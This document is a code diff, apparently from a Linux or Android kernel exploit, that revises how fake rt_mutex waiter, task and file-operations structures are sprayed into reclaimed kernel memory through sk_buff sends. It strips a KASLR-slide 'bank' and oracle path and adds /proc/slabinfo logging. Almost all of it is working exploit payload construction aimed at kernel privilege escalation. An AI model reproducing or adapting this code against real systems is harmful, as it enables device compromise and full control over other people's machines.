@@ -11,26 +11,21 @@ static struct mm_ctx pre_ctx;
 static struct mm_ctx post_ctx;
 static pid_t child_leak;
 
-#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
-    defined(SLIDE_P0_OFFSET_CANDIDATES)
-static const uintptr_t slide_bank_offsets[] = {
-  SLIDE_P0_OFFSET_CANDIDATES
-};
-static uintptr_t slide_bank_payload_base;
-static uintptr_t slide_bank_parents[SLIDE_BANK_SLOTS];
-static uintptr_t slide_bank_targets[SLIDE_BANK_SLOTS];
+static void log_mm_slabinfo(const char *stage) {
+  FILE *fp = fopen("/proc/slabinfo", "r");
+  if (!fp) {
+    return;
+  }
 
-_Static_assert(
-    SLIDE_BANK_TASK_OFF + (SLIDE_BANK_SLOTS - 1) * SLIDE_BANK_TASK_STRIDE +
-            FAKE_TASK_PI_BLOCKED_ON_OFF + sizeof(uint64_t) <=
-        SLIDE_BANK_LOCK_OFF,
-    "slide task bank overlaps lock bank");
-_Static_assert(
-    SLIDE_BANK_LOCK_OFF + (SLIDE_BANK_SLOTS - 1) * SLIDE_BANK_SLOT_STRIDE +
-            SLIDE_BANK_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <=
-        ORDER3_SIZE,
-    "slide lock bank exceeds reclaimed page");
-#endif
+  char line[256];
+  while (fgets(line, sizeof(line), fp)) {
+    if (strncmp(line, "mm_struct ", 10) == 0) {
+      pr_info("mm slabinfo %s %s", stage, line);
+      break;
+    }
+  }
+  fclose(fp);
+}
 
 uintptr_t page_base;
 uintptr_t fake_lock;
@@ -42,126 +37,12 @@ uintptr_t fake_left;
 uintptr_t fake_fops;
 uintptr_t binwrite_target;
 uintptr_t slide_p0_offset;
-uintptr_t slide_oracle_parent;
-uintptr_t slide_oracle_target;
-uintptr_t p0_gate_page_struct;
-uintptr_t p0_probe_page_struct;
 char ashmem_path[256] = "/dev/ashmem";
-
-static void put_fake_waiter(unsigned char *payload, size_t waiter_off,
-                            uintptr_t tree_parent, uintptr_t tree_right,
-                            uintptr_t tree_left, uintptr_t pi_parent,
-                            uintptr_t pi_right, uintptr_t pi_left,
-                            uintptr_t task, uintptr_t lock,
-                            uint32_t priority) {
-  put64(payload, waiter_off + 0x00, tree_parent);
-  put64(payload, waiter_off + 0x08, tree_right);
-  put64(payload, waiter_off + 0x10, tree_left);
-#if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
-  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
-        pi_parent);
-  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, pi_right);
-  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, pi_left);
-  put64(payload, waiter_off + FAKE_WAITER_TASK_OFF, task);
-  put64(payload, waiter_off + FAKE_WAITER_LOCK_OFF, lock);
-#if COMPACT_RT_MUTEX_WAITER
-  put32(payload, waiter_off + FAKE_WAITER_WAKE_STATE_OFF, 0);
-#endif
-  put32(payload, waiter_off + FAKE_WAITER_PRIO_OFF, priority);
-  put64(payload, waiter_off + FAKE_WAITER_DEADLINE_OFF, 0);
-#if COMPACT_RT_MUTEX_WAITER
-  put64(payload, waiter_off + FAKE_WAITER_WW_CTX_OFF, 0);
-#endif
-#else
-  put32(payload, waiter_off + FAKE_WAITER_TREE_PRIO_OFF, priority);
-  put64(payload, waiter_off + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
-  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
-        pi_parent);
-  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, pi_right);
-  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, pi_left);
-  put32(payload, waiter_off + FAKE_WAITER_PI_TREE_PRIO_OFF, priority);
-  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
-  put64(payload, waiter_off + FAKE_WAITER_TASK_OFF, task);
-  put64(payload, waiter_off + FAKE_WAITER_LOCK_OFF, lock);
-  put32(payload, waiter_off + FAKE_WAITER_WAKE_STATE_OFF, 0);
-  put64(payload, waiter_off + FAKE_WAITER_WW_CTX_OFF, 0);
-#endif
-}
-
-#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
-    defined(SLIDE_P0_OFFSET_CANDIDATES)
-int select_slide_payload_slot(uintptr_t offset) {
-  if (!slide_bank_payload_base) {
-    return 0;
-  }
-  for (size_t i = 0;
-       i < sizeof(slide_bank_offsets) / sizeof(slide_bank_offsets[0]); i++) {
-    if (slide_bank_offsets[i] != offset) {
-      continue;
-    }
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-    return select_slide_payload_index(1);
-#else
-    return select_slide_payload_index(i);
-#endif
-  }
-  return 0;
-}
-
-int select_slide_payload_index(size_t index) {
-  if (!slide_bank_payload_base || index >= SLIDE_BANK_SLOTS) {
-    return 0;
-  }
-  fake_task = slide_bank_payload_base + SLIDE_BANK_TASK_OFF +
-              index * SLIDE_BANK_TASK_STRIDE;
-  fake_lock = slide_bank_payload_base + SLIDE_BANK_LOCK_OFF +
-              index * SLIDE_BANK_SLOT_STRIDE;
-  fake_w0 = fake_lock + SLIDE_BANK_WAITER_OFF;
-  slide_oracle_parent = slide_bank_parents[index];
-  slide_oracle_target = slide_bank_targets[index];
-  return 1;
-}
-
-static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
-                                 size_t slot, uintptr_t parent,
-                                 uintptr_t target) {
-  size_t task_off = SLIDE_BANK_TASK_OFF + slot * SLIDE_BANK_TASK_STRIDE;
-  size_t lock_off = SLIDE_BANK_LOCK_OFF + slot * SLIDE_BANK_SLOT_STRIDE;
-  size_t waiter_off = lock_off + SLIDE_BANK_WAITER_OFF;
-  uintptr_t task = payload_base + task_off;
-  uintptr_t lock = payload_base + lock_off;
-  uintptr_t waiter = payload_base + waiter_off;
-
-  put32(p, lock_off + 0x00, 0);
-  put64(p, lock_off + 0x08, waiter);
-  put64(p, lock_off + 0x10, waiter);
-  put64(p, lock_off + 0x18, SLIDE_LOCK_OWNER_VALUE);
-  put_fake_waiter(p, waiter_off, 1, 0, 0, parent, 0, target, task, lock,
-                  SLIDE_FAKE_WAITER_PRIO);
-  put32(p, task_off + FAKE_TASK_USAGE_OFF, 0x100);
-  put32(p, task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
-  put32(p, task_off + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
-  put64(p, task_off + FAKE_TASK_TASK_GROUP_OFF, 0);
-  put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
-  put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF,
-        waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
-  put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08,
-        waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
-  put64(p, task_off + FAKE_TASK_PI_TOP_TASK_OFF, task);
-  put64(p, task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
-}
-#endif
 
 void setup_kernelsnitch(void) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-  kernelsnitch_set_profile(
-      ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
-      SLIDE_KSNITCH_REPEAT_MEASUREMENT,
-      SLIDE_KSNITCH_AVERAGE);
-#endif
 }
 
 int kernelsnitch_collisions_ready(void) {
@@ -245,8 +126,8 @@ void log_startup_context(void) {
              getpid(), (unsigned long long)P0_PHYS_OFFSET,
              (unsigned long long)P0_KERNEL_PHYS_LOAD,
              (unsigned long long)P0_KERNEL_PHYS_DELTA,
-             (unsigned long long)SLIDE_NFULNL_LOGGER_NAME,
-             (unsigned long long)SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR,
+             (unsigned long long)SLIDE_NFULNL_LOGGER,
+             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
              (unsigned long long)SLIDE_INIT_TASK,
              (unsigned long long)SLIDE_ROOT_TASK_GROUP,
              (unsigned long long)SLIDE_SYSCTL_BOOTID);
@@ -483,10 +364,6 @@ void close_reclaim_sockets(void) {
   }
 }
 
-int reclaim_receiver_fd(void) {
-  return reclaim_sv[1];
-}
-
 void close_ctx_memfds(struct mm_ctx *ctx) {
   for (size_t i = 0; i < ctx->mm_cnt; i++) {
     if (ctx->memfds[i] > 0) {
@@ -551,94 +428,10 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 
   uintptr_t payload_base = base + SKB_DATA_DELTA;
 
-#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
-    defined(SLIDE_P0_OFFSET_CANDIDATES)
-  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    slide_bank_payload_base = payload_base;
-    for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
-      unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
-      memcpy(p + P0_ORACLE_GATE_PAGE_OFF, "RMG-P0-ORACLE-GATE", 18);
-      for (size_t slot = 0; slot < SLIDE_BANK_SLOTS; slot++) {
-        uintptr_t parent;
-        uintptr_t target;
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-        if (slot == P0_ORACLE_GATE_SLOT) {
-          parent = direct_to_page(base);
-          target = pipebuf_page_base +
-                   P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
-          p0_gate_page_struct = parent;
-        } else if (slot == P0_ORACLE_PROBE_SLOT) {
-          uintptr_t direct_addr =
-              P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE) +
-              P0_ORACLE_PROBE_OFFSET;
-          parent = direct_to_page(direct_addr);
-          target = pipebuf_page_base +
-                   P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE +
-                   sizeof(struct user_pipe_buffer);
-          p0_probe_page_struct = parent;
-        } else if (slot == P0_ORACLE_GATE_RESTORE_SLOT) {
-          parent = p0_gate_page_struct;
-          target = 0;
-        } else {
-          parent = p0_probe_page_struct;
-          target = 0;
-        }
-#else
-        uintptr_t offset = slide_bank_offsets[slot];
-        parent = SLIDE_NFULNL_LOGGER_OBJECT + offset;
-        target = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + offset;
-#endif
-        slide_bank_parents[slot] = parent;
-        slide_bank_targets[slot] = target;
-        size_t task_off = SLIDE_BANK_TASK_OFF +
-                          slot * SLIDE_BANK_TASK_STRIDE;
-        size_t lock_off = SLIDE_BANK_LOCK_OFF +
-                          slot * SLIDE_BANK_SLOT_STRIDE;
-        size_t waiter_off = lock_off + SLIDE_BANK_WAITER_OFF;
-        uintptr_t task = payload_base + task_off;
-        uintptr_t lock = payload_base + lock_off;
-        uintptr_t waiter = payload_base + waiter_off;
-
-        put32(p, lock_off + 0x00, 0);
-        put64(p, lock_off + 0x08, waiter);
-        put64(p, lock_off + 0x10, waiter);
-        put64(p, lock_off + 0x18, SLIDE_LOCK_OWNER_VALUE);
-
-        put_fake_waiter(p, waiter_off, 1, 0, 0, parent, 0, target, task,
-                        lock, SLIDE_FAKE_WAITER_PRIO);
-
-        put32(p, task_off + FAKE_TASK_USAGE_OFF, 0x100);
-        put32(p, task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
-        put32(p, task_off + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
-        put64(p, task_off + FAKE_TASK_TASK_GROUP_OFF, 0);
-        put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
-        put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF,
-              waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
-        put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08,
-              waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
-        put64(p, task_off + FAKE_TASK_PI_TOP_TASK_OFF, task);
-        put64(p, task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
-      }
-    }
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-    return select_slide_payload_index(P0_ORACLE_GATE_SLOT);
-#else
-    return select_slide_payload_slot(slide_bank_offsets[0]);
-#endif
-  }
-#endif
-
   fake_lock = payload_base + LOCK_OFF;
   fake_w0 = payload_base + W0_OFF;
   fake_task = payload_base + FAKE_TASK_OFF;
   fake_fops = payload_base + FOPS_TABLE_OFF;
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-  if (payload_mode == PAGE_PAYLOAD_FOPS) {
-    slide_bank_payload_base = payload_base;
-    slide_bank_parents[0] = fake_fops;
-    slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS) + 0x10;
-  }
-#endif
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
     fake_parent = fake_fops;
     fake_right = data_addr(ASHMEM_MISC_FOPS);
@@ -672,9 +465,9 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   uint64_t pi_top_task = text_addr(INIT_TASK);
   uint32_t waiter_prio = FAKE_WAITER_PRIO;
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    write_pc = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset;
+    write_pc = SLIDE_LOGGERS_0_1 + slide_p0_offset;
     write_right = 0;
-    write_left = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset;
+    write_left = SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset;
 #if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
     waiter_task = fake_task;
     task_group = 0;
@@ -701,8 +494,20 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       put64(p, LOCK_OFF + 0x18, fake_task | 1);
     }
 
-    put_fake_waiter(p, W0_OFF, 1, 0, 0, write_pc, write_right, write_left,
-                    waiter_task, fake_lock, waiter_prio);
+    put64(p, W0_OFF + 0x00, 1);
+    put64(p, W0_OFF + 0x08, 0);
+    put64(p, W0_OFF + 0x10, 0);
+    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, waiter_prio);
+    put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
+    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
+    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
+    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
+    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, waiter_prio);
+    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
+    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
+    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
+    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
+    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
 
     put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
@@ -731,11 +536,6 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 
     if (payload_mode == PAGE_PAYLOAD_FOPS) {
       put_fake_fops_table(p, FOPS_TABLE_OFF);
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-      put_slide_bank_entry(p, payload_base, 0,
-                           slide_bank_parents[0],
-                           slide_bank_targets[0]);
-#endif
     }
   }
   return 1;
@@ -764,15 +564,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
-#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
-    defined(SLIDE_KSNITCH_APPENDED_FUTEXES)
-  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    kernelsnitch_set_profile(
-        ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
-        SLIDE_KSNITCH_REPEAT_MEASUREMENT,
-        SLIDE_KSNITCH_AVERAGE);
-  }
-#endif
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.childs[i] = clone_child();
@@ -890,6 +681,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   sched_yield();
   sched_yield();
+  log_mm_slabinfo("before-leak-close");
   SYSCHK(close(memfd_leak));
   memfd_leak = -1;
   size_t drain_triggers = prepare_ctx.mm_cnt / mm_objs_per_slab;
@@ -901,21 +693,14 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     prepare_ctx.childs[index] = -1;
   }
   pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
-  int reclaim_sends = SKB_RECLAIM_SENDS;
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-  reclaim_sends = APP_SLIDE_RECLAIM_SENDS;
-#endif
-  int reclaim_sent = 0;
-  for (int i = 0; i < reclaim_sends; i++) {
+  log_mm_slabinfo("after-late-drain");
+  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
     errno = 0;
     ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
     if (sent <= 0) {
       break;
     }
-    reclaim_sent++;
   }
-  pr_info("sk_buff reclaim sends=%d/%d mode=%d\n",
-          reclaim_sent, reclaim_sends, payload_mode);
   kernelsnitch_cleanup(ks);
   ks = NULL;
 
@@ -941,12 +726,7 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
     max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
   }
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
-    size_t started_ns = gettime_ns();
     uintptr_t base = prepare_kernel_page(payload_mode);
-    size_t elapsed_ms = (gettime_ns() - started_ns) / 1000000ULL;
-    pr_info("kernel page prepare mode=%d attempt=%d/%d elapsed_ms=%zu "
-            "base=%016zx\n",
-            payload_mode, attempt, max_attempts, elapsed_ms, base);
     if (base) {
       return base;
     }
